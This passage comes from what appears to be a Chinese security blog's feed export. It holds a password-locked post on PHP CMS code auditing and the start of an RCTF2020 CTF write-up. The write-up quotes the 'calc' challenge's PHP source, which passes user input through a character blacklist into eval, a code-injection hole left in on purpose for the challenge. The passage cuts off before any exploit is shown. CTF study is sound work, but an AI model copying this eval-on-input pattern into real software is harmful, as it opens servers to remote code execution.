  <script id="hbeData" type="hbeData" data-hmacdigest="a40914d332eed0a94fb345a8a6ec4cca0f2051af78e387661cd7863f0985c1db">541ed2b57286a70f48aa3dc8388e3d2e3310d0bdeecfcd97d2b251025de583d6e546b0e407031e7c4e9736bbfdad5a5335300566be53d20cc88b9a6b8a88ddde63b5afd375dbe42127dded9abe80dfd9c27b07af48926a3702b85617387c13bb222f143254388a43ff2459683304675af88a61dd80ade6110435477a0818dea845dbc3536c7166ef4dd8ffea5ebb898aedaa3ab723f40dd69699092543db54afecd3d872d37618dbc243ccdd82fd62c64281ab7390b41fccb48317d44acf80f6527c77acb71e579d23b33a1322514d57f2bb3ce08c350f250907e92653065e7089956c0afd696a07382ae4374dc04564819325673f66f9c20fa6e309a1c8fca639e254555510a02d92d75214e0765024f260e47ef2ddc376bc448b7d3b371f273df97c42bf1a4631871ddedabb77396fb0ae96c9f42b5c41f4eb4c67da414531de8479eb49a4e57296364fab4ccac046139a95c4406a47000dbd6b07f9805ca73dacbcde4e8e1b3545269357b095a36aaeff398f24d0d5dc568e48594af62171b28d1d644283dbfad7d0061b32e6c58abf79ddea107bc0179d8acdf2a1a6eb19ef7aec30450942c644657b3e564fb7e41e9630d3de3b0279429e8fcaa018f04d36d898972f0184c518e595200d948689d33254cf7b5faf034da1cba60b0d83b788f7c6a599fbbaede55915ef190039b30249485f94143421e74d37b318e9ebd15edc280a9712986b940912b4a826d61b524f904ab2d259546cbe92ffd63e6b4725c1e054003f014ba3180cb0054900bd31b069a51375d4a1796f729e4a86f8be70467316f7505c00975dc3e5502ce87ff3e4f9d02ea709a0e0f4ca812bfc1a131a8bb828e8fee697c48fc972dee18f2a7148c0b0aff5b0bfbbfbd9eed2dfe7cf441706ec2f629cb6e22c2ba6e7ee5d412f176bedd280a7f1f7d603f0cdbeb6fa32d602899d865fbb74e5c5fabc140b65196da7e354ad3dd9e9f21e76dead831bcec517c86aa437a39765a4ffac580759bc05e142f5bc6b2c825ccd737610143430c49558c1c5aed60d38cc5837dcd68221ca0cf4f64850ce9b1fd808e58ffc32ddf2279a6563432c0ae825fa5f7c42663b637ad73bf647eee7bb4d4d294212f8cb5b9939622cea14be28dbd9f162df5ae709871899fbeda0e841fb70e2937a09a02d4d0fdf8e05e2029758b2f67f0a872ddfc476c46bf8103729d0cda263cb5e16ca0a10452189024afb4905639afb58bd610150387116dc13e26c0eccdb652798f1cfdd980fb51d5798d1f8c047822a06bab72d5818f5f64534f9878bd3a00b37098bae57ac0d86cf3689f6bf720bf184ec692a77186b234c302f87791b67fd464379d30f2a9c36719250a71d02a91015097f33add7d790e2d66091ae1925c87da0f11a4261ecd849efee40d21d7cc6b0bfc863fdf18bd323a2f140f71c1bdd0c65678ac5e718f5dce2c354b24ac2fcd59507227305bfcd408345b3ea3504c24662ebf34b7c3e8146cc85e7f31cee292421f0262ba6d7f6072fe80a041ede60ddf505b1e9c12db9535187cd1a90abb0d9334f400d7ba5ad6b9b0bfad498535c8345f10f01c54612db3bf53d3150212d89c2db56a20af8df217603fb5b85ea9a23548e1b4d76c3b64231fb751bff14bbf3dbcfacc70cbdd8e2457cc5653b31f05036d08bcfc7cad3ff7d2814a78e02e64cb90320d3db3eb8f443cea305ce547c73bd84787d8a5802565048715082ba60670670b16dc780580569d982f9e8698c147971e24a965d240637aa09a0fd99ea79001676c6c652c5a7d6304851c1a1bb00d4de941f3d035f69e56917e7438f75ffbfebc2873b4c4fc87a71575a02aac72891be46abbe7d4e06ccc5739f25f0d603c233a5c13e4e0c3f47be3f9885d6520e99b359d7cefeafe3d231e393b6ae94b2f8a3edc3d88f70fbe64b2232c32756edd3f2b1185314fd989730bf80df2ff1e2b680f77dc80e5d93159fe2d73f2b081624d2f3e8c931a6d473eddc35650aa20a5b579ea7c8793d8a1bf5f230716f1af92f5cef12513d2f9f16160d0bba67e206eb2446fd3c155e14fc83f5247e5a4e30772e2ec9e3e13f3dd5274a42379e982f54a6532acbb56733bc2d9c7325e02120d9656395383f2c32dc8180cb9f6c93bd5a75ea6cf59fb0b149a5d281adf3a6e12faa990c991a39be590a590a0510883a4a35daf7f9082fdb2fe05293e8063d58c2efe138c1911f1349aa45a968a7bb8bfd33e686c479e7e58aa340eda6e2ad67cdcefbef369b6572bb09d7b60ccc623f1d49934bc01c4596f975fd0564d138320c0e6bc27e2501a73a7dd5cf7a00e68685668af481e95f95371f1e9d5cf98e8dc56a0c29cae2981fda3502bccff9084ae628fbe44c59e5ed757053814b55f7ab0de553efdd220742c140a8b82e4e608861b2d592fc16c89a630bd000646ac2d7c21aa5e1d40a0385ca614a1570fce82d58e3788d1685f9302414fcadbaa1ce43e52d855dc7ab565c463e15555487ed49f33b4f3ceb190100e43ba20547a02d1dddcc2dc5136018d8ce1ead9d613d5c0c3f368ad593940366ab2860d307c14c24fa0ae841c21c34490a08e5c5b7d2c1c8d5705e1263399cd69919f9cb43ebd086e372382a0f149c1891f828fbbb4e263f19389edceaf3c1c56586cca17cec598c08ac7e1353b76cf8f81af4132e8e69e53cb6e02ac733b25f9ca1ce349d5f0cc8984047b8f71fe4d38a82af955f13ddc58df69c1682a0cabf2b180de9718d4eb6636a7886e61be091b53884405cf6cb2920ceddda695dfdec81938859aaa92a74af37d314abd18595f663f6f9280acb88d3a17043e5973b1f56860d10d22121a1d76fbb20be34083a2780abe205a1a209e430c5d0d44b7488cceb4932263f39e48bf2439b2f103dc7a0b78baf83a51f6ed7123f298ec02df35890a6b01326a8cfb638404630bc213f984527489368685e4e46cca58d7396a659324b4b076ea743f261375173a75451b82caae42da0d2720fe6d7810eb6248207cef177990232172dafeb2164456db4a4b581e704d6497d05288b1176d7cc5868d2bbe40bb3a54a652bc53a65fddb6a06c650433f24836f16712fe03ea6992b4ed95e905873ff1f907d0c7ecb75b082dc5cf014c53912e79769827f5aa456db5a9bf8cff8e8049b9f0325fbf5ec4e3c699253223e74b960f1c022d79128de957dd4e3f0d1dbbd813badad1716b84aff2596eb6aae9174601b88afae45be51d26d2535e799e6af0ffc9452fa344c3637aed3c336c0fcf365ac2ae36bde03caf4e401bebce908cbe1a447efafaa4b4d33684f741a700d1ba1b1112d722735747506db010625913e96c31dd7f35931a069e03fae4781c7a619bc2cca4cd2d4fe34f3d0d4ee2eeac773871cbd2b94a156662d256fac36407784f0027c169f2fc55281e225654740ad1d01d228d897cdcc2301362670419272aa02dfb7ad904dfe335a75c4c8687e06d8a5bf56c6f6b158ed4ef70f2b94a49575502a3cf5b5b0497a8c13440d893a6e0e6463434a867abee4d5f1b66af43589213b04a9b40a6204ee3fc15fee32cc3279ab15b85dd66a13fd043849e1fc764b939775a2f92c87d145af62bbb843e8152b4f4e3ce3778f71be4d3b0bf48a2fd524e5c70b14f524fb150dec93e9ed68ecefd95a18110cffd22a0997e7f7ff8ed65af8161c0e2311394f6f373a6bca64450bd218f148f17e0c982dab6a39f86daf801d62362b2cfbb09923e7345392c8dedd04e43175dfaa6bab70ff71b965c562b7c5677b072b3d0a66562ca62a4af69d64369668991b9876886567ad10d39107a964b482ff80c45c7d5378b7cdf7f2699d2bf1a71e7c4db1ab05b33862e3b71c65379cc9296e63aa6594af99b965369a97157d053f68e823b694aed4f556e8fb6212b67cfe5be85078a3931f63bb1003d429d006d880e6a345c64d4866db93b4f5143b5e0b091af8722a6d82502c2c6d3952617a3ba5c26002879c5ba3e708c8d702018de097537ab4d286941251dd13942cc193c609638f6bac16708c594d32d46e845cb9b98cf89e28a61654d78988d6571eda736e9160bd3d0ec7022e4b315a203888da2cfcb20430bd8f88db3d3f9092335b1bd8163ed6c650e9595e6a1caa62005934692429f608000bbe0113ca18aeca5f6c01a6e7f87c4077a9efae4b696e0ac8c29d68cc82f34e24db09fd112cf974f4ffccaa18e6ec1c3836c32882f43e16a604041592879781b117abd9a019aa06f00c861eb3b2aef4315adcee43b0728b7f472d1ade05956848532309e04154d14edb198758e1754c7390e3ca8454eaf2ac0b20bca42bc0303b2d3b777549f2d02822eb69229ec10f779a34776496ca1f061014a82c605388ac4454f015e0ea7eee431a3902eb9f98b69f6cb189526054c3cc1f8ed304eccba111459abb54669b5f1faebdb72f96ffeef90e45fee65d837d13c36ab46d2c1b713a2adc94cf4eb3c8d4bdc6ead496f86ee3eb76027e7dd79aebaffe7953c58258a247521ee005a9e6cf294035465873dcee35793ab594a762d00cdb0e7021a620c0faae8e2e989032a60cc5a8e45d6a94f866212c70d4941e1b77c02c90aca31e99092b851363f0ff28a40118fce5a59ec00758c026d8f851e8b807c42710d5e55aa67b1dc0a091ce8df6deee55e198a654a54800557bc9ce3f49f0de936b83bcfc944c930c8aff76f94020c610352a9736e08b79beefa3387c2482f511885143f4c0e363898fe2d5dc71080a6f911102ba5eae14eb05a8954651c5f2364d23a136c1bdce279684980349bb2b0e4618e9c25cb23ca87e55ea8a0307db4babfe5783956c4ee48a12db26fb5986a145a006f660b9a13924a2c573f4fe983fb26582eea3e847e4ca24455a36106c5929406ef81481cf05e6b649f028d1a9c953e1d14a8a94906ecad130fa02e4e1318b4f684188693db11b59e0d2a37005fb03efab380ef2e736505d2d7b83fbf8f076f8b7b2ff1024bc34219e77f4947cf43eea2e12e7ffb4365e8dd34964d9030bbd43def5fa038617697dc0f7176f5ffc6a1ba68607bc5895610e933de0674ae579955b2742461f3451761e5025e0715424852cc5605269f5fd88f285c6409fa0cd03a4b4f15ce162e2d691da3619bd82b941c5e97b5c7bea0da700a283d215cbf6518d3539645f264d3f1b3546b56a9450362005276d927c4dbcbcfa00cb841d3963e03027920722bdd8a50c61b492655b7af187c1a06f7bab8ac6baa7c94ed94cff648816df3fedd8359d51fee27caf1fc03475c51e690b204c212df13c1135c5d0089730987cbc0ab5c2d9da1e56270de2e9d41d81c7901d271de6a079b80428da6113547ad4a4b62d45553574e54276428f80aae3fa4771729d401f23eb461c949f89c02b4618ddea2e1932f6f3a6dd9139f7c8f7d1c683d799b4a434879b6a633e42ead90c04175ebbace877ab98a71bc367cb28a8386080eecf672df543ec024a9c14fa2fd4e277eb5828197de4f766cfd1d44cdb4b0336d4dd71b7ed2293c5d055fdc349c09a3eeaa11978eee6bbf39191870b5ce8026419d3da14b4fe6e5c4a4ea8a7d0d43c7d6d35c21dac6f9715a5fc734d22ae18a09656a121d3ed9e79b8d463ab81b62fdf5749d9d4a9fc3755adc1183a3065d6b9c881b03ceed469ca1786050bcd5d951fba59a782bdce3695bf179fdbca53bcb9b6febd331d9ac0f415d6c9cb783ba72172f5c73721e5a841db3f8e403cb2bc08c71307e0309fa0a11c013edca1f9d62dbd114ce64ac06394b36cb3832baa97fc610d45b2e50697c018d0a9a3233657adf0c93e54c4bf20d9f2684ead7cf59f672a1eb4fbd0dace74a7c3b98806461163164f511231dde350db646f1446f9be30bf0ee8d211302078afd368b71d40c416cbb9bc50fe4dd57e23ae2dc9d851b64df3b06b2f50b06f955ef0a572b2c5cef5bb3e3ef79f2f60e26f366ff73849cd5e21b481021a5fca16daf699ec209db0b1297e7a4b7bd03c7a980c8679118e54d485bf86205f90af20caa3cd5af11b2e59496c5bcbea80c248f7364ad766b9977ef5e1ccb2a3d69f4096b841dc3a64b690294db45a55b253fc8026006fc6619f1caa3914975a05622d903e8c9c31b6748998f04b79a1ede561f607208e0f44064e1c0ce370db1fbc579ef8460a9abad64e22a99ff97a044c3d5a04855aab7bb4c5ef83314a8cfd2a544213f7e37f7f79043233b3003ecfc82aa0ca08088ffa91d8d01a8ce3968d593c493fe579ead933b8def11d337beb2eed1c4e22c79cad7f9799aeb9e6af4e1197b6038081b25e10cec45e5c83e8fa00a3c8292747937cd7a72a061d6a117d7c329bab7e09d1d1f205a933a8fc7535b767812a5564b8eb5996fecdb23d8d604ba159239ffc747b816d633ba1313c279ab1514135edb1de5005935dd1a220af7c2ad2b6173515c551a05d35859e99ae1ea056c2c43627564cfdb39cac0d61115e6402824a686d9a28089e716818f5a98a724b08126180ac21a9756d0643cece093e157b3714e02aed3d44db1805e10bf4c0623a2986bf88a370552ec202a7cbdab504f1164c33a624578e7faa822ae8c65f0d7c75f51250b9c97cadaeadf885b0789375c09bfb467c4f03a7480a7a9de0d656e9fe0a3405db9458cf3fcf2a0deb42aba036c6f66292a53cdfa8c9b4ae215e0d6e948eadd4b7d4c51fa172c678d5fa8ca4d960bed61d332ec3bebd802ca436bee9983785e5ccd46fddb6e088d2a7b39e8cf51f510188a773f06cc4a71a209a5cff315a194e3995c0c56da285f55abcfcc17d5e7ef014dc77d42584f9a407a341bd8ca63c50737293ce6fba41674825149e075f6ab6876c856582f28a4fd5cbba6c2eaa96e3a168ed8d60e5eabb203280fa0626e2034c82b6c3ec7d203c60d66124d4e5880f00fe57d361d1219fe90407f2a9d0fb6514c6103a38e4de56b1a8566c34c0d319320d2810d079934e64a6cfc530e77851503e25c6c3107375d501e5f774b2c9f9c6634138e47e4be14682e0474aeeb8ea63db6d6d1ca77dec2cc7fe270e92af8191c696e3eed7a0cbfab9daf10d65ef00b1fa751ba7633aee8b9b231d099c16eb9ffaceb785dc39c796d08ef1589f1bdb995fa9ce92af23879c704dbc9e6f7298185067ce8124abec675be0141a1a55c38cda6924052ce3a65ff8bace4b4f55c3267039196619eb5de73b7c0ee1dd0881652d0cbc20940a9a8ab5a09e24a5e4d3c0fa1a0f10bb28f077962a4fbdac5d48a04b5c47362964181bc547c01c50d395a2ca9da934d4b3b70fe9c5f141bce4e4555eb7bbd6e8f0ccdad2ecc21279cd7eb65749c6ffd295a85fc20401b882c171f608688f381a98c15893f2e68a34b09ed0fe9aad4b4e6c09606b2044ac2d728d3ff3022f54457b1c4c251d50bcc770073b9f71a5e9228be6cfdd41ec5a3405044d930e390672ea96a6c53592c485416f11a4fa7803767516f43485a4989bf6c644e76e385313f9559b6b8770fc291ad3ec2a0bec2b67a680490f780549b3778b3c74eba9b976c621768ebfe09f01a245af76514e8e05d6c856e4df22c98ab8c6d9530bbb4bc106d4e7337126ad8c316af4416541adc44bc2cfd01925a024d3db85153378cee772d9fb0a8cbfeaf64c55b9db0627ae4b262e918c3f8356a8bf14fcf6840d729bb40db81dcd313f84a470e5c40b30d46f8c5ad4b53c4a4d1127c67dcbf3f4e3d0fd1966a31d4de2c7fdc863c26d3956543a2487dc80094ca426c1c22c68bfc0f24ec82ea3d5f4161d191995903959e66955344eca7fce63c52fdc7bc5f0bba7fc9300b79b6331388af6b6f88876c650c9be15e4ca75018859edc65b71310e0e1f665c73940711d5fb0256a71d8c3039398e6da172580656a959925feed6fb51736be0acf077522f8b885cf692ddb9f93079a25765bb79b313886e854db331ea476bbbebf72eeedb907439da1de844d6c13ce54ab4657d6e5126a40e188ebfa6f1262bbbd4ceec3e1a148b18bd6f14e9fc9307bc9f6d185da44fff4a510ae0b6837a7e11ff4a33119305efc473e799f834eebb2087780b864bafabdd04f817407cbc6a86577d55a4318ccbbdebf01182a47bc834763b2bf0274713711af58d0727f2509f91b00bb6ab098235f107096d1141d40d5e9458be6d8af2b9c64f1983e7f871ff2956f1a500bbc539da12a1177e6c0e9b93c335caca85097c5b4fc3e9c43e80eeee4f99bdad62f77eb48f924dc91598ac37ad5579b0c8ebb19b2a53cb49cbbf3a19878dc44708f57c09e8277b5ff46fcbbdcf53950d887d682da4661f99f7ee2a41ea8ab235978801482a1a67d34cdb1c99078ec8f2d13ab2fea93da61dccc1df86e9c2527cb409ee2f45566b12af2ca6f07c4b35bfe2290a1c7786a916835e25af9c083b6e4a422ae1274b66ae4fcce937977acc9bcbfa6c0f7082141c5d82c2d83e3d015f5157be1b1afb277b683fb993b700d8de9813c8cb699e1c84ad1c583484ed43fab5af6ad41c1e44ede04a4dbd7503213094326e79a1218779fd2da0693253d10fbdced1bdabfbe30d3471363e99bb116b627edefb7c3cbc41c73c07fa399e44c4e898ea7b2743bc1adfabc7168a8c2d62c14caa522ae5463f704b5fab9b95106037647afb1c188dd7fb2cc2f8be9b25b5eb621c52c8cf6cfbd394c180451a9ed078af6d74f4a141df788d009f9860513c18b484436a2240014bb94ce4aeb06ed570e32d9ecbf716c7ce0979f379977f91186c8f4246eb76ffbbf3405ebc702dc1d5022a2fb390333c3bcc2bfa70851624eed056740b1b241f980b20c07849a63ee323d98f81059716747c5f3d78f25ae19b8dce7e533edc04c8ce7490ab9e1b35e3282cf6e5f538716110656638adceb317cc5e28c530ed72740293232d1aaac8ff27854e5e4ff5b7d2b392701ecf6829df9628855fa03e9f3e1777f90ab97b0bb1d57accb2aaf511e6e516c0a91a4794a8db673f2b3b5df231baf72cf4fd41fead79e5c11e720b396cfb8790b6e311de9b68ca3e2e785163c220c1dd00f1514094274e10109fa4f80f4a9096efbe000e179a59ac844bbb52c228b41a9587112da06198212faa5458fe6fc0495e86fdf5ea5e58558490540b18f02b668f634912588102afef85afefa4316feae4cdffd79194751e4367d06ad8b8195af252a405ecc2bef67f825fd142a5d52a3dd63381c12cdcdcaf04aa15f1d944006c2e255607ac39e9f6737a9553acf73e70a69d772334ab0ebb774cf6bd81c8083604e1f0fd83073e0ed66dc1320d91f34eaeea931177bf624df7a32dbcd497154c8ce8f4080c9783b09201410fb1a734125a48956512102c68952b67bbaef9b39dc15b6fb993a884b5bce0adf1e3d569e628478f8293c3fb0bdaa6fac187694f0160e469248ae7f33a6f4cfe90ab20c6e8be115a47ffd31dd3b4910c73c598f93088abae5a4434e8c6ae135a0ef629819af1605955562595bfeb2131680449f03aad4e314670ffb6cb1f86f0cb2b8fa2cc044686a397806be396e911e7f83d8f3781069312b25ef18d81071493934c9acb72aa59785fd708a6f0d221bce42ade6422702b650e581cd7a213d3aa28f9c080ed84fdc5da4b9421ddb10246c5e1931d338eb5837b1501dab86bcc20a5a1ee68b9a724485d925e456d8b27503e62154de8e07af71e4432ab9943c26f7397377de8c9465da7c0cffc6afa51a350f481eee1bd93b1e5c017c8efc9f558bc14efb79c9e2c91ff144a65787c9e65b7790ff210bded7d9c0082954f11677cdb7fc92ea5bab6c6be3042f86659602c0d9ba4285d8c8712f15ca6a32e3a0dcbce64293fe163db889583ef6d24a3c71f5809279575b5112ba86498abc07ac1f35f06e87872f8783d59b551cf3c965f0ca6f5f0e510867ad60cceb476e1427ac5ee3055fe4997fda1fef19f40372d11aeec3731115d25338f1bcdd6390ba1e4ef4d2f3e00ad5219185b76595013b77ca77c8525527cc31bff8fedd2ec8e866868507818cf3a4f49ee172ff78258cb31e4d84075af2220037cf97943338acc92281ba420565aefc2c8d8108dec25d4f9f43ed85dc09b8522544ac6cfe2be7c339bb80f945564d05f6d5d3ef3ef40a7f2b393ff1b9355e7cfbc28395baf816146d280434335a61b54dc7645bc09dc76c3304ba73e1386bc783f33c0d541fb1133d1e0efba70f0cc9d5745da42844a3793329baf69a6bcd7e4f75e714dc80f956388a908690710724dc364a1d1d650aed8cf3ceedafa4e39f7d469d06c0d2fb663fa4a05af0bbf82fcc6d43cdf4a79aef90130655bde384bdc3d15aa3f374450f51d4c04b29ae2910ca1e0575ad00b977e7b1e97f0a99f520a178c860ce3ac3635af88c2006a32e0adf758b9052c910a1cf2535e139be0eddc03c9e46d9f1828619fada135faf09de1082f495a87eeec31b6b4cd498128bf0abb48a2573ee29c1550031046bf7ac3f334b656f894de535386352ab6cc14dbf5cdd28c7c3c484431cb7edbc68f155a4b885fda4a93d5ffe85bc2bc72049ac04b67d897f8a993ad14b3f9cd986b80559a49493065dbe48ccde38f7826804e35a981b4c68f828f08a322bc593826a14d6fb3d905db8bf11ccbad6fc475b2b5ca3d6ad5ec57b49dc8f0b49868da5462996bd1ed724c182b9933513e6c157277e8302fb2bedd055516a2d126bb19ecce9b18ef828642f520e2b7740da3449687d2dca7adb8e834118101f8f2c33d7dab2b59a15f9e636766cd2e6a7adb21755c120bead3c62f92ede227072d66e2b6911b20564ac21c68570af8effe890ba8e18e8c29536331a6001edbd025fb5ac28f9ece055141f55c100bd1e02158a6bb10bf1a0b107b3d6a543dc2f7e402571f29e291f0b9aa3298b75a5d35da669db54c48959f9db48e8ad79e012e8b223efc155ef95bce766b67de5b669ca3118302ce5c4ac888e19930453240e0378929e8311ec9db3082643b8b061ed5f3e508dae174bf49c0ac1eecec33715ac43728e7b6f5af3abee097570c6f147d987680cd5f1798dfbe8fdf7389fb04b40182c71d503e50254c90ddf6ae8af020dbdd62eaceadad104d824712f84bfa7167476ca9c8d1e5759bfa6b0fc73dd21793bc4a6a70a80003b9fbe5e4c757191d5d75da2d3e1998dffeddc56c6f4703b4f27e777eff4a074c1880e0eee1657692fbe248fe78664e408a16b4a6f9f74a6239749f61caa7dae4b6c6d66cf3822c453e9c3549562a211668c49ead45f630a48a7ccc4f0cc5f1d950dcd1a572254b66af4bb075d19946c0b4955c8b674420756e9233d51c51c2e88218fb03fc8298bc311e3fca580f9272ac902ba231f1ec05b25bad43157653e75baeb74890fcb295cd367d7c0ca1e5534fdfbf8180bc253ddd57b4242d388dee1810309a09f7414e3ef03c031ddbbbb5dbafbeb2f3bc4c8c71deb2a23500b8f2c03fbced016514c31e24279819ad4de874e0341e0fee31f0d62d69e4d78bd907ce385939b828b274a5d913a119163b28c11d080d710e1ff206ff546c7689f5c9c31ce3a4c5b3d7da9763d6fd19c98f75de4eeb2d087ea05d3e11cd22fecbf3c0a553419d97fe3f8f6a731fc9e2d61d8359b26ed765c1101e0adeb25905cf587b83f8c78407ea49a4ee0f15d0fd31ce51e6c2c99bf2d96a04bb182482080467f42af1859facecf101c584ac4ad1883187294953b24917eb3f1e6d49b8f58e68a80a989879c5065a96dff6d4dc3aeea4a82ff97db12277f9e7fb5b1b51f1b37a2a8a2d9e93dbc8928fc9ffa01e6ed065ba492043379a7fb1e4d7a8cd3daf8b04134c006dcf60402ed5e355154aac9de02396a526d20119ffe6afb6adc5db312934567b8b39ab17d1dfa9deb18139f49327fda10c0356b995ca89b3dc5bcff3f34182d90fdfbb7bae2713d9b88a2cf33ddd47029513cf6eb9fab461df43e9773dcacf3cd5a2a52cdf84ab198bdf5458d0ab2aa3f246d7d142a3ceaf8b0d35a282a422f221b4b5e660137846a99dec54c56f5581fa761f18d2f110711c3b3ef6baa4d30ec524eb5180b6d9105f4b2eeb83e75d48a66f2c83e2191b20c4dea2cf861b2824c9bace5bf1e9119c2ef312bb1b080e74de22eabfbaea92bc078098f16984b74667801ffbf47295043ba040c2e7b144b4dcbc0ef517ea5716275081ad2b462bceadd28c997e279d487403097115bc07fdd9d1a2093ace082269f79596a6516293882bfc9f06c1ec42b4f2901e1b3250b0661a930628e40824880a6b853463a727a7650135fcd4035b0674134fe40c130f454b49355b88bf44416c8fa49e1fbeefba48c09e084186cf13f733e416a1c2f911af61b5b3769137c1a9e550e1ec64b98e654a39814ea553db0e0a4238460906fa68e1ddce4866548c9e7da9c13e5668eab9f522ea3bff7410707d2c1759c8f846bf216202d9bed0e5516d950a36637d5efe4d5d284c846a0da4de277e9fc99baf69aeb015b076dfefe882543d67df18d330df5294e3647d7e4a0eef12082fa7016c79c9f7fa5ac98f3a91b2bec75ee998a45f7bd487367c7d5631cdbb910adb04af5d0d0960debd42cfcfd9e016572d2b1dd459454105b8c0766e4fb9e5b0b530a0febb7d1db2d404035a8a30768c612119007a5eef9fa0495e145fe50b2ac44e5b7032a359d08feff575c32076a3fbf44588b58c608c8876e3d84140551c353a02376a377ff1a7120dc16b6a69f18de339d58181a7ab6fa487e572289f19ab9c79514943ffc8cc482e47b1fc50393d0af96862aaaae092675d3c84ee3d3f25879d5a18d334694542cadd44c8f0acd65017c6658940b10a6065260433ee0d7cc20fdd25added9f12abd55401b4a76e143ba655ed6bb9f919f03ad3551eb0b51e3396b9e943fe7ec4466ba98af0cddd74376eb5d2b3ccea15b8e6ddeadc1819dac49ac84627c2ba0e587d4e55642c3e7761c32211154597c90d6ceccc212308ac0564e6471a87d42718b582014f6b48ed1838df1678daf32ec0a7988b36ae5dc882c47d9518dc4a11e1f40486119dd4bbfa772766bb9bf79fa14148972f0aedb4a14bd53e0caeb4ba47f1a51f52311c602e833d2de2ddd40d333a9b7cc76fde84acad84edede31ffadf2b5041dc05581e13cd86a6172919601ca7b422728625eaf7dcf8b7ec89e39e748bc8501131de3cf76d181bba546eca74aa4fd2fc643b34dae94a45d9fae32997d178478d2e3717ab38f6f8592b885b67ab9a529382e0044725b5d98537033d44928adafc5bc0797c4bbd3d365af84dd28addba6c5dde9294edbf669571c4b8a5d5dfcb0c61a56069c586abc572214d97a4918d461d79ad17d19d5154b87c48bbb9e41676649f11ff5ab407aca766dc7ec2980220778bab7661580b7206df546e33359483f01ac23997365e9d78ff0b641130c4afed6dd98e81193c4620333f4c71fe870bf6c8c4254efac3d4a2bdef1158b14641a428f6d1a66c1a96d129d6ea74acadbb8bc945d43728a177ab31799a9cb6d5961f727f2f1d541d6820f0bf538b6c6799ad029c1ab9bb71745bce02db0214b1f0288e2f3f4bee262556ebf6fa04d9196854462af3323f67febbbc7321a649c27287ea78761c7d1b6df15a7b6207915088d4fc253a95937c093bc617d2c78f58be584affceb90a3885613e404561cdfe464cef2da27005e6565d2bd077580cf88fa654591e37878f851bd090dca4832e88ecd85effb229bdecfe9cd8e59f59f51fd03151697f7e54254dde0f68fa3673b79d10ae3d4911c1b3eb27bcb338d831ce6d90b6afab2907d540bd4d04ea0949d32fe9fd591011946ab0df4a7b1e2752592a17fbdff58ac271ed0c96906ce3dff8504b8154e98e8965fe94ba489e334e69e4b316f0cece58b83fb3a2fe10e6139a68cb2050b234e8c785691c73ca832d5f2360a1b392ca375852d93815db4a11c343b99cddbacde27b365a4bee61d3be562d58fa64bbb33c629da30dd7bf3fc7499353f4f4506a5ed3f4d1642ad7340583f063176810809ff24285337caf647074f20aab31a95038f354adb82591fec1d76e99ccd64f13d7c06c8b6e6b7d4ec1826eccc89041224584a63e5ee3cc80d8c1e3ba84993492d11fdea9b47e97bde74565b8690ab6fc16bb3436c1599d6310efb4349799a4b47d26b3d658fdb47b232fe32e1a123d9f834bedc5806984b0387ca153ec044a8d6bc9b5ec3e9756999d17bf98e3e4b0158bac94ece4df2447c7738ff4ae6b9b947f76b1788bd29963fb71610a271f3701084fbc3831b277a14a3e239e07819a608a8e4f4c629f21f07e8da1636177ffd5048cf8e4399da493ca2d52748fcd4b6bf6edf6ebc6a5a4e7dab71ad2c541186799efa618ed426efe05c85589f683f03de6e2d63b21727f3d47cb3b8aa03ce90e23d57d2f857871b025ac34c2a46eea4f08a3b8e6dfff0339f58e6bb8b799200e5476df832ed92d8ceefd55acc92cd15bbade4f5adf82cbfb3da4c3251b71f6858dd1fae0ee483ff3ac1f033533b57606bf6568a2841994e737cb2a8e83453b9b2113304e7088d12372f6ac3da665bda3f9231158eb81711e49eaa5fe3fff84c45fc8e4f2084548d7e4cdee6b15be04b202d0220ee1d463e93619ff9f24f35d890fb9974837aa8b3d5358ab99e2caaa7be859fc18e40daa5544c0a8c4efa8db0874ab564cef81c74ac38c82eed76529ff41d70e00373c10e5bf0d359728e13f1607d9996e0c0b51ea84fe39967fa8890525fce5e50d288d482423c80043a08b5d2579f5ecbb88b1a3847b0f7c2727b2e634c6e6d22f96e6a238f6cb31b316a891712af2ac0921f47eb8c727e6c7c63d42042016ad30fe8d106bc9e</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>代码审计</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>CMS</tag>
      </tags>
  </entry>
  <entry>
    <title>RCTF2020-复现</title>
    <url>/2020/06/RCTF2020-%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="1-calc"><a href="#1-calc" class="headerlink" title="1.calc"></a>1.calc</h3><p>RoarCTF2020的<a href="https://github.red/roarctf-web-writeup/" target="_blank" rel="noopener">easy_calc</a>的升级版,过滤了更多字符，但思路还是一样的</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'num'</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $str = $_GET[<span class="string">'num'</span>];</span><br><span class="line">    $blacklist = [<span class="string">'[a-z]'</span>, <span class="string">'[\x7f-\xff]'</span>, <span class="string">'\s'</span>,<span class="string">"'"</span>, <span class="string">'"'</span>, <span class="string">'`'</span>, <span class="string">'\['</span>, <span class="string">'\]'</span>,<span class="string">'\$'</span>, <span class="string">'_'</span>, <span class="string">'\\\\'</span>,<span class="string">'\^'</span>, <span class="string">','</span>];</span><br><span class="line">    <span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blackitem) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/'</span> . $blackitem . <span class="string">'/im'</span>, $str)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"what are you want to do?"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    @<span class="keyword">eval</span>(<span class="string">'echo '</span>.$str.<span class="string">';'</span>);</span><br><span 